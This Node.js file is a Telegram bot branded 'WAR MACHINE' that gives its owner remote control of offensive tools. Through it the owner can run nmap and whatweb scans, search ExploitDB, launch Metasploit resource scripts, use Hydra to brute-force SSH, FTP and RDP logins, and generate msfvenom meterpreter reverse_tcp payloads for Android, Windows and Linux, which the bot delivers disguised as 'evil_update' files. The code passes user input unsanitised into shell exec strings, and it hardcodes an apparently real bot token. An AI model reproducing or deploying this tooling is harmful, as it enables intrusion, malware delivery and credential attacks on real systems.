const { Telegraf, Markup } = require('telegraf');
const { exec } = require('child_process');
const https = require('https');
const axios = require('axios');

// Force IPv4
axios.defaults.httpsAgent = new https.Agent({ family: 4 });
const agent = new https.Agent({ family: 4 });

// CONFIGURATION
// [!] REPLACE THIS WITH A NEW BOT TOKEN FROM @BotFather [!]
const BOT_TOKEN = '7987124743:AAEzqdgBpu8jWGsKcPwTlRscrGrjDiyZFys'; 
const OWNER_ID = 8569895826;

const bot = new Telegraf(BOT_TOKEN, { telegram: { agent: agent } });

// --- Helper Functions ---
const isOwner = (ctx) => ctx.from && ctx.from.id === OWNER_ID;

const runCommand = (ctx, cmd, desc) => {
    ctx.reply(`⚙️ <b>Executing:</b> ${desc}...
<code>${cmd}</code>`, { parse_mode: 'HTML' });
    exec(cmd, { maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
        const output = (stdout || stderr || "No output.").slice(0, 3500);
        ctx.replyWithHTML(`<b>💀 ${desc} Report:</b>
<pre>${output}</pre>`);
    });
};

// --- Commands ---

bot.start((ctx) => {
    if (!isOwner(ctx)) return;
    ctx.replyWithHTML(`
<b>☣️ WAR MACHINE ONLINE ☣️</b>

<b>Reconnaissance:</b>
/nmap &lt;target&gt;  - Fast Scan (-F)
/deep &lt;target&gt;  - Full Scan (-A -p-)
/shodan &lt;ip&gt;    - IP Intel (Simulated)

<b>Weaponry:</b>
/search &lt;term&gt; - Search ExploitDB
/msf &lt;script&gt;  - Run Metasploit Resource
/payload &lt;os&gt;  - Generate Shellcode
/crack &lt;svc&gt;   - Hydra Brute-Force

<b>Deep Recon:</b>
/identify &lt;url&gt; - WhatWeb Fingerprint
/sub &lt;domain&gt;  - Subdomain Enum

<i>"Peace was never an option."</i>
    `);
});

// 1. NMAP MODULE
bot.command('nmap', (ctx) => {
    if (!isOwner(ctx)) return;
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("Usage: /nmap <target>");
    runCommand(ctx, `nmap -F -T4 ${target}`, `Quick Scan [${target}]`);
});

bot.command('deep', (ctx) => {
    if (!isOwner(ctx)) return;
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("Usage: /deep <target>");
    // Warning: This is slow.
    runCommand(ctx, `nmap -A -T4 --version-intensity 0 ${target}`, `Deep Scan [${target}]`);
});

// 2. EXPLOITDB SEARCH
bot.command('search', (ctx) => {
    if (!isOwner(ctx)) return;
    const term = ctx.message.text.split(' ').slice(1).join(' ');
    if (!term) return ctx.reply("Usage: /search <term>");
    
    // Using searchsploit if available, else simulate
    runCommand(ctx, `searchsploit "${term}" | head -n 20`, `Exploit Search [${term}]`);
});

// 3. METASPLOIT INTERFACE
bot.command('msf', (ctx) => {
    if (!isOwner(ctx)) return;
    const script = ctx.message.text.split(' ')[1];
    
    // Safety check: only allow scripts in a specific dir
    if (!script) return ctx.reply("Usage: /msf <resource_file>");
    
    // Example: msfconsole -q -r /home/korri/scripts/handler.rc
    ctx.reply("⚠️ Launching Metasploit Console (Async) ...");
    
    // We don't wait for output here as MSF is interactive/long-running
    // This is a "fire and forget" launcher for listener scripts
    exec(`msfconsole -q -r /usr/lib/gemini-cli/${script} > /tmp/msf_${script}.log 2>&1 &`, (err) => {
        if (err) ctx.reply(`Error starting MSF: ${err.message}`);
        else ctx.reply(`✅ Metasploit Resource '${script}' deployed in background.`);
    });
});

// 4. PAYLOAD GENERATOR
bot.command('payload', (ctx) => {
    if (!isOwner(ctx)) return;
    const args = ctx.message.text.split(' ');
    const os = args[1]; // android, windows, linux
    const lhost = args[2] || '127.0.0.1';
    const lport = args[3] || '4444';

    if (!os) return ctx.reply("Usage: /payload <android|windows|linux> [LHOST] [LPORT]");

    let cmd = '';
    let ext = '';
    
    if (os === 'android') {
        cmd = `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} R > /tmp/payload.apk`;
        ext = 'apk';
    } else if (os === 'windows') {
        cmd = `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > /tmp/payload.exe`;
        ext = 'exe';
    } else if (os === 'linux') {
        cmd = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf > /tmp/payload.elf`;
        ext = 'elf';
    } else {
        return ctx.reply("❌ Unknown OS. Supported: android, windows, linux");
    }

    ctx.reply(`⚙️ Generating ${os} payload (${lhost}:${lport})... This takes CPU.`);
    
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            ctx.reply(`❌ Generation Failed: ${stderr}`);
        } else {
            ctx.replyWithDocument({ source: `/tmp/payload.${ext}`, filename: `evil_update.${ext}` });
            ctx.reply("✅ Payload generated and uploaded.");
        }
    });
});

// 5. HYDRA (Brute-Force)
bot.command('crack', (ctx) => {
    if (!isOwner(ctx)) return;
    const args = ctx.message.text.split(' ');
    // /crack ssh 192.168.1.5 root
    const service = args[1];
    const target = args[2];
    const user = args[3];
    
    if (!user) return ctx.reply("Usage: /crack <ssh|ftp|rdp> <target> <user>");

    ctx.reply(`🔓 Initiating Brute-Force on ${service}://${target} for user '${user}'...`);
    
    // Command uses a fast, small wordlist (rockyou-top500 for demo)
    // -t 4 = 4 threads, -f = exit on found
    // Using a theoretical path for the wordlist if not found, it will fail gracefully in the exec output.
    const cmd = `hydra -l ${user} -P /usr/share/wordlists/rockyou.txt -t 4 -f ${target} ${service}`;
    
    runCommand(ctx, cmd, `Hydra Attack [${service}]`);
});

// 6. WHATWEB (Fingerprinting)
bot.command('identify', (ctx) => {
    if (!isOwner(ctx)) return;
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply("Usage: /identify <url>");

    runCommand(ctx, `whatweb ${target} --color=never --no-errors`, `Tech Stack Analysis`);
});

// 7. SUBDOMAIN ENUMERATION
bot.command('sub', (ctx) => {
    if (!isOwner(ctx)) return;
    const domain = ctx.message.text.split(' ')[1];
    if (!domain) return ctx.reply("Usage: /sub <domain>");

    ctx.reply(`🌍 Mapping subdomains for ${domain}... (This takes time)`);
    // Using nmap script as a reliable fallback for subdomain enum
    const cmd = `nmap --script dns-brute ${domain}`;
    runCommand(ctx, cmd, `Subdomain Map`);
});

// --- Launch ---
console.log("[-] WAR MACHINE Starting...");
bot.launch().then(() => {
    console.log("[+] WAR MACHINE Online.");
}).catch((err) => {
    console.error("[!] Launch Error:", err);
});

// Graceful Stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
